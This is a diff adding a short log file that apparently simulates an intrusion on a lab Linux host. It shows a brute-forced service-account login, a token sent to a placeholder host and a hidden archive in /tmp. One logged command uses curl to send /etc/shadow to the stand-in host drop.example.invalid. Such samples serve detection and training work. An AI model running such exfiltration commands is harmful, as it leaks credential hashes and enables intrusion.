@@ -1,0 +1,8 @@
+2026-10-20T04:52:07Z INFO  boot version=3.8.1 host=lab-linux-02 pid=812
+2026-10-20T04:55:31Z WARN  auth failed user=svc-backup src=198.51.100.23 attempt=5
+2026-10-20T04:57:02Z INFO  auth success user=svc-backup src=198.51.100.23
+2026-10-20T04:58:44Z WARN  outbound request url=https://drop.example.invalid/u/9f3a2c token=Bearer abc
+2026-10-20T05:01:19Z ERROR exec cmd="curl -s https://drop.example.invalid/u/9f3a2c -d @/etc/shadow"
+2026-10-20T05:03:55Z DEBUG archive=/tmp/.cache/9f3a.tar.gz size=248192
+2026-10-20T05:06:10Z WARN  dns query=telemetry.suspicious.invalid type=A
+2026-10-20T05:09:48Z INFO  shutdown code=0
